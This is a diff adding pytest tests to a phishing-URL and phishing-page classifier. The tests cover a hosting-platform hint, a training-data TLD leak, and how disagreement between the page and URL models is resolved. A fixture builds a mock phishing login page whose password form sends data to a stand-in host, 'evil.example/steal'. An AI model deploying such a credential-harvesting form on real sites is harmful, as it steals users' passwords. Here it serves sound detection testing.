@@ -420,6 +420,214 @@ def test_visa_shaped_html_is_not_phishing():
     assert proba < float(artifact.threshold)
 
 
+def test_free_hosting_platform_feature_marks_shared_hosts():
+    from phishing.features.phiusiil_url import is_free_hosting_platform, platform_suffix
+
+    assert is_free_hosting_platform("https://kit.firebaseapp.com/login") == 1
+    assert is_free_hosting_platform("https://mysite.wixsite.com/home") == 1
+    assert is_free_hosting_platform("https://vercel.app") == 1
+    assert is_free_hosting_platform("https://github.com/") == 0
+    assert is_free_hosting_platform("https://www.visa.com/en-us") == 0
+    assert platform_suffix("abc.vercel.app") == "vercel.app"
+    assert platform_suffix("example.com") == ""
+
+    # Subdomain depth is NOT rebased onto the platform suffix. Doing so cost
+    # 4.7 points of live recall in analysis/07, because it also lowers every
+    # kit parked on the same suffix.
+    assert extract_phiusiil_url_features("https://abc.vercel.app")["NoOfSubDomain"] == 1
+
+
+def test_free_hosting_platform_is_not_a_model_input():
+    """The platform flag stays a routing hint; as a feature it was a class leak.
+
+    PhiUSIIL has 22,478 phishing rows on these suffixes and exactly one
+    legitimate row. Trained as an input it took second place by importance and
+    scored real docs sites at p ≈ 0.999, so it must never reach the estimator.
+    """
+    assert "IsFreeHostingPlatform" not in PHIUSIIL_URL_FEATURES
+    assert "IsFreeHostingPlatform" not in PHIUSIIL_MODEL_FEATURES
+    feats = extract_phiusiil_url_features("https://kit.firebaseapp.com/login")
+    assert "IsFreeHostingPlatform" not in feats
+
+
+def test_platform_hosts_still_carry_the_tld_prior_leak():
+    """Documents a *separate* leak that removing IsFreeHostingPlatform does not fix.
+
+    PhiUSIIL has almost no legitimate ``.io`` / ``.app`` rows, so
+    TLDLegitimateProb is 0.013 and 0.0015 for those TLDs. The URL-only model
+    therefore still scores real docs sites and app deployments at p ≈ 0.83–0.95
+    on the URL string alone. This is a property of the training table, not of
+    the platform feature, and it is why the scanner must not publish a
+    URL-string judgment as a live-site verdict. Locked in so a future TLD-prior
+    fix has a failing test to flip.
+    """
+    from phishing.tuning import load_payload
+
+    try:
+        payload = load_payload()
+    except FileNotFoundError:
+        pytest.skip("no trained model")
+    artifact = payload["artifact"]
+    url_est = payload.get("url_estimator")
+    if url_est is None or artifact.extra.get("dataset", "").find("PhiUSIIL") < 0:
+        pytest.skip("served model is not PhiUSIIL URL-only")
+
+    tld_prob = artifact.extra.get("tld_legit_prob") or {}
+    feature_names = list(artifact.extra.get("url_features") or PHIUSIIL_URL_FEATURES)
+    for url in ("https://docs.github.io", "https://nextjs.vercel.app"):
+        feats = extract_phiusiil_url_features(url, tld_prob=tld_prob)
+        row = pd.DataFrame([{name: feats[name] for name in feature_names}])
+        proba = float(url_est.predict_proba(row)[:, 1][0])
+        assert proba > 0.5, f"{url} p={proba:.4f}: TLD-prior leak appears fixed"
+
+
+def _kit_shaped_html(title: str = "Sign in") -> str:
+    """Thin login page: a password form and nothing else a crawler can use."""
+    return (
+        f"<html><head><title>{title}</title></head><body>"
+        '<form action="https://evil.example/steal">'
+        '<input type="password" name="pw"><input type="hidden" name="tok">'
+        '<input type="submit" value="Sign in"></form>'
+        "</body></html>"
+    )
+
+
+class _FixedProba:
+    """Estimator stub returning one probability, whatever the row."""
+
+    def __init__(self, p: float):
+        self.p = p
+
+    def predict_proba(self, X):
+        import numpy as np
+
+        return np.tile([[1.0 - self.p, self.p]], (len(X), 1))
+
+
+def _stub_payload(monkeypatch, page_p: float, url_p: float):
+    """Real artifact and thresholds, stubbed estimators.
+
+    Live pages that pin the page model at p ≈ 1.0 cannot be reproduced with
+    synthetic markup, so the reconciliation rule is exercised directly.
+    """
+    import phishing.scanner as scanner
+    from phishing.tuning import load_payload
+
+    payload = dict(load_payload())
+    payload["estimator"] = _FixedProba(page_p)
+    payload["url_estimator"] = _FixedProba(url_p)
+    monkeypatch.setattr(scanner, "_loaded_payload", lambda: payload)
+    return payload["artifact"]
+
+
+def _fetch_for(url: str, html: str) -> FetchResult:
+    return FetchResult(
+        url=url,
+        final_url=url,
+        ok=True,
+        status_code=200,
+        html=html,
+        soup=BeautifulSoup(html, "lxml"),
+        n_redirects=0,
+    )
+
+
+def test_url_disagreement_pulls_down_a_rich_legitimate_page(monkeypatch):
+    """A modern homepage that pins the page model at ~1.0 must not stay phishing.
+
+    NoOfExternalRef / LineOfCode / NoOfSelfRef are 76% of the page model and
+    are exactly the columns that shifted since the 2023 crawl. When the URL
+    string disagrees, the URL score is the honest one.
+    """
+    from phishing.scanner import scan
+
+    try:
+        _stub_payload(monkeypatch, page_p=0.999, url_p=0.02)
+    except FileNotFoundError:
+        pytest.skip("no trained model")
+
+    url = "https://www.soschildrensvillages.org.uk"
+    result = scan(url, tier="B", fetch=_fetch_for(url, _rich_legit_html("SOS")))
+
+    assert result["url_disagreement"] is True
+    assert result["page_probability"] == pytest.approx(0.999)
+    assert result["probability"] == pytest.approx(result["url_probability"])
+    assert result["verdict"] not in {"phishing", "suspicious"}
+    assert "URL disagreement" in result["model"]
+    assert any("drift" in note for note in result["notes"])
+
+
+def test_url_disagreement_leaves_an_agreeing_page_alone(monkeypatch):
+    """Both models call it a kit: nothing to reconcile, the score stands."""
+    from phishing.scanner import scan
+
+    try:
+        _stub_payload(monkeypatch, page_p=0.999, url_p=0.99)
+    except FileNotFoundError:
+        pytest.skip("no trained model")
+
+    url = "https://login-verify-account.example.com/signin"
+    result = scan(url, tier="B", fetch=_fetch_for(url, _kit_shaped_html()))
+
+    assert result["url_disagreement"] is False
+    assert result["probability"] == pytest.approx(0.999)
+    assert result["verdict"] == "phishing"
+
+
+def test_url_disagreement_does_not_excuse_a_free_hosting_kit(monkeypatch):
+    """The platform hint's whole job.
+
+    A kit on shared hosting has a clean-looking URL by construction, so the
+    disagreement rule would otherwise talk it down to legitimate. Same scores
+    as the rich-page case above; only the hostname differs.
+    """
+    from phishing.scanner import scan
+
+    try:
+        _stub_payload(monkeypatch, page_p=0.999, url_p=0.02)
+    except FileNotFoundError:
+        pytest.skip("no trained model")
+
+    url = "https://secure-login-verify.firebaseapp.com/"
+    result = scan(url, tier="B", fetch=_fetch_for(url, _kit_shaped_html()))
+
+    assert result["url_disagreement"] is False
+    assert result["probability"] == pytest.approx(0.999)
+    assert result["verdict"] == "phishing"
+
+
+def test_unreachable_host_reports_a_url_pattern_risk():
+    """Withheld verdicts still carry a URL-string judgment for the UI chip."""
+    from phishing.scanner import scan
+    from phishing.tuning import load_payload
+
+    try:
+        load_payload()
+    except FileNotFoundError:
+        pytest.skip("no trained model")
+
+    fetch = FetchResult(
+        url="http://paypal-secure-login-verify.example/confirm",
+        final_url="http://paypal-secure-login-verify.example/confirm",
+        ok=False,
+        status_code=None,
+        html=None,
+        soup=None,
+        n_redirects=0,
+        error="name resolution failed",
+        error_kind="dns",
+    )
+    result = scan(
+        "http://paypal-secure-login-verify.example/confirm", tier="B", fetch=fetch
+    )
+    assert result["verdict"] == "unreachable"
+    assert result["risk"] is None  # still no live-site rating
+    assert result["url_pattern_risk"] in {
+        "phishing", "suspicious", "probably safe", "legitimate",
+    }
+    assert "URL pattern" in result["rationale"]
+
+
 def test_url_only_model_does_not_flag_apex_https_brands():
     """Failed fetch / tier A must not report p≈1.0 from a missing www. label."""
     from phishing.tuning import load_payload
